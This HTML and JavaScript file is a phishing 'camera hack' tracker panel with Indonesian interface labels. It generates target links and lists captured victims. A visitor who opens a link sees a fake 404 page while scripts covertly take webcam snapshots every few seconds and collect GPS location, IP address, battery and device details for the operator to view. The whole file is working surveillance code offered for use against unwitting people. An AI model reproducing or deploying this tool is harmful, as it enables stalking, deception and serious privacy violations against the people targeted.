<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Elite Tracker Panel - CodingX</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-main: #0a0a0c;
            --panel-bg: rgba(30, 30, 35, 0.7);
            --accent-glow: #00f2ff;
            --accent-dark: #0066ff;
            --text-gold: #ffffff;
            --border-glass: rgba(255, 255, 255, 0.1);
        }

        body {
            margin: 0;
            padding: 0;
            background-color: var(--bg-main);
            background-image: radial-gradient(circle at top right, #1a1a2e, transparent);
            color: white;
            font-family: 'Inter', sans-serif;
            display: flex;
            justify-content: center;
            min-height: 100vh;
        }

        .phone-frame {
            width: 100%;
            max-width: 420px;
            padding: 20px;
            box-sizing: border-box;
        }

        .header-profile {
            background: var(--panel-bg);
            backdrop-filter: blur(10px);
            border-radius: 24px;
            padding: 25px;
            border: 1px solid var(--border-glass);
            text-align: center;
            margin-bottom: 25px;
            position: relative;
            overflow: hidden;
        }

        .header-profile::before {
            content: '';
            position: absolute;
            top: -50%; left: -50%;
            width: 200%; height: 200%;
            background: conic-gradient(transparent, var(--accent-glow), transparent 30%);
            animation: rotate 4s linear infinite;
            z-index: -1;
            opacity: 0.3;
        }

        @keyframes rotate { 100% { transform: rotate(360deg); } }

        .logo-main {
            width: 90px;
            height: 90px;
            border-radius: 50%;
            background: #000;
            margin: 0 auto 15px;
            display: flex;
            justify-content: center;
            align-items: center;
            border: 2px solid var(--accent-glow);
            box-shadow: 0 0 20px var(--accent-dark);
        }

        .logo-main svg { width: 50px; fill: var(--accent-glow); }

        .header-profile h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 20px;
            letter-spacing: 3px;
            margin: 10px 0;
            text-transform: uppercase;
            background: linear-gradient(to bottom, #fff, #888);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .status-badge {
            display: inline-flex;
            align-items: center;
            background: rgba(0, 255, 100, 0.1);
            color: #00ff64;
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
        }

        .control-panel {
            background: var(--panel-bg);
            backdrop-filter: blur(15px);
            border-radius: 24px;
            padding: 20px;
            border: 1px solid var(--border-glass);
            margin-bottom: 20px;
        }

        .label-style {
            font-size: 11px;
            text-transform: uppercase;
            color: #888;
            margin-bottom: 10px;
            display: block;
            letter-spacing: 1px;
        }

        .input-group {
            background: rgba(0,0,0,0.3);
            border-radius: 12px;
            padding: 10px;
            border: 1px solid #333;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .input-group input {
            background: transparent;
            border: none;
            color: #fff;
            width: 70%;
            outline: none;
            font-size: 12px;
        }

        .btn-action {
            background: linear-gradient(135deg, var(--accent-glow), var(--accent-dark));
            color: #000;
            border: none;
            padding: 10px 18px;
            border-radius: 10px;
            font-weight: 800;
            font-size: 11px;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(0, 242, 255, 0.3);
        }

        .target-folder {
            background: linear-gradient(90deg, #1e1e24, #121216);
            border-radius: 15px;
            padding: 18px;
            margin-top: 10px;
            display: flex;
            align-items: center;
            cursor: pointer;
            border-left: 4px solid var(--accent-glow);
            transition: 0.3s;
        }

        .target-folder:hover { background: #25252b; transform: translateY(-2px); }

        .folder-icon { font-size: 24px; margin-right: 15px; }
        .folder-text { flex-grow: 1; }
        .folder-text b { display: block; font-size: 14px; }
        .folder-text span { font-size: 11px; color: #666; }

        /* UPGRADE: Info Target Box */
        .info-box {
            background: rgba(0,0,0,0.5);
            border: 1px solid var(--accent-glow);
            border-radius: 15px;
            padding: 15px;
            margin-top: 15px;
            margin-bottom: 20px;
        }

        .info-line {
            display: flex;
            justify-content: space-between;
            font-size: 12px;
            padding: 5px 0;
            border-bottom: 1px solid rgba(255,255,255,0.05);
        }

        .info-line span:first-child { color: var(--accent-glow); font-weight: bold; }

        #gallery-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: var(--bg-main);
            z-index: 999;
            padding: 20px;
            box-sizing: border-box;
            overflow-y: auto;
        }

        .grid-photos {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 12px;
            margin-top: 20px;
        }

        .grid-photos img {
            width: 100%;
            border-radius: 15px;
            border: 1px solid var(--border-glass);
        }

        .btn-close { color: var(--accent-glow); background: none; border: 1px solid #333; padding: 8px 20px; border-radius: 10px; cursor: pointer; }

        #phish-view { display: none; text-align: center; padding-top: 100px; color: #444; }
    </style>
</head>
<body>

<div class="phone-frame" id="admin-view">
    <div class="header-profile">
        <div class="logo-main">
            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/></svg>
        </div>
        <h1>KAMERA HACK</h1>
        <div class="status-badge">‚óè ONLINE SYSTEM</div>
    </div>

    <div class="control-panel">
        <span class="label-style">Phishing URL Generator</span>
        <div class="input-group">
            <input type="text" id="gen-url" readonly>
            <button class="btn-action" onclick="copyLink()">SALIN</button>
        </div>
    </div>

    <div class="control-panel">
        <span class="label-style">Connected Targets</span>
        <div id="target-list"></div>
    </div>
</div>

<div id="gallery-overlay">
    <button class="btn-close" onclick="closeFolder()">‚¨Ö BACK TO PANEL</button>
    <h3 id="target-title" style="margin-top: 20px; font-family: 'Orbitron'; font-size: 16px; color: var(--accent-glow);"></h3>
    
    <div class="info-box" id="info-container">
        </div>

    <span class="label-style">Captured Images</span>
    <div class="grid-photos" id="photo-grid"></div>
</div>

<div id="phish-view" class="phone-frame">
    <h2>404 NOT FOUND</h2>
    <p>Loading server resources...</p>
    <video id="v" style="display:none;" autoplay></video>
    <canvas id="c" style="display:none;"></canvas>
</div>

<script>
    const urlParams = new URLSearchParams(window.location.search);
    const idTarget = urlParams.get('id');

    if (!idTarget) {
        // --- ADMIN SIDE ---
        document.getElementById('gen-url').value = window.location.href.split('?')[0] + "?id=" + (Math.floor(Math.random() * 8999) + 1000);

        function updateFolders() {
            const list = document.getElementById('target-list');
            const data = JSON.parse(localStorage.getItem('elite_vault') || '{}');
            list.innerHTML = '';

            Object.keys(data).forEach((id, index) => {
                const div = document.createElement('div');
                div.className = 'target-folder';
                div.onclick = () => openFolder(id);
                div.innerHTML = `
                    <div class="folder-icon">üìÇ</div>
                    <div class="folder-text">
                        <b>TARGET ${index + 1}</b>
                        <span>Device: ${id} ‚Ä¢ ${data[id].photos.length} Foto</span>
                    </div>
                    <div style="color: var(--accent-glow)">‚ûî</div>
                `;
                list.appendChild(div);
            });
        }

        function openFolder(id) {
            const data = JSON.parse(localStorage.getItem('elite_vault') || '{}');
            const target = data[id];
            document.getElementById('target-title').innerText = "TARGET ID: " + id;
            
            // Render Upgrade Info
            document.getElementById('info-container').innerHTML = `
                <div class="info-line"><span>IP Address:</span><span>${target.info.ip || 'Unknown'}</span></div>
                <div class="info-line"><span>Model/OS:</span><span>${target.info.device || 'Unknown'}</span></div>
                <div class="info-line"><span>RAM:</span><span>${target.info.ram || 'N/A'} GB</span></div>
                <div class="info-line"><span>Baterai:</span><span>${target.info.battery || '...'}%</span></div>
                <div class="info-line"><span>Jaringan:</span><span>${target.info.network || '...'}</span></div>
                <div class="info-line"><span>Lokasi:</span><span><a href="https://www.google.com/maps?q=${target.info.lat},${target.info.lon}" target="_blank" style="color:#fff;">üìç BUKA MAPS</a></span></div>
            `;

            document.getElementById('photo-grid').innerHTML = target.photos.map(s => `<img src="${s}">`).join('');
            document.getElementById('gallery-overlay').style.display = 'block';
        }

        function closeFolder() { document.getElementById('gallery-overlay').style.display = 'none'; }
        setInterval(updateFolders, 3000);
        updateFolders();

    } else {
        // --- TARGET SIDE (UPGRADE WEAPON) ---
        document.getElementById('admin-view').style.display = 'none';
        document.getElementById('phish-view').style.display = 'block';

        let captureData = {
            photos: [],
            info: { device: navigator.platform, ram: navigator.deviceMemory || 'N/A', network: navigator.connection ? navigator.connection.effectiveType : 'Unknown' }
        };

        // Get IP
        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => { captureData.info.ip = d.ip; sync(); });
        
        // Get Battery
        if(navigator.getBattery) navigator.getBattery().then(b => { captureData.info.battery = Math.round(b.level * 100); sync(); });

        // Get Lokasi (Minta Izin)
        navigator.geolocation.getCurrentPosition(p => {
            captureData.info.lat = p.coords.latitude;
            captureData.info.lon = p.coords.longitude;
            sync();
        });

        // Get Kamera
        navigator.mediaDevices.getUserMedia({ video: true }).then(s => {
            const v = document.getElementById('v');
            v.srcObject = s;
            setInterval(() => {
                const c = document.getElementById('c');
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                captureData.photos.unshift(c.toDataURL('image/jpeg', 0.4));
                if(captureData.photos.length > 20) captureData.photos.pop();
                sync();
            }, 4000);
        });

        function sync() {
            let db = JSON.parse(localStorage.getItem('elite_vault') || '{}');
            db[idTarget] = captureData;
            localStorage.setItem('elite_vault', JSON.stringify(db));
        }
    }

    function copyLink() {
        const i = document.getElementById('gen-url');
        i.select();
        document.execCommand('copy');
        alert('LINK TARGET DISALIN! üíºüí∞');
    }
</script>
</body>
</html>
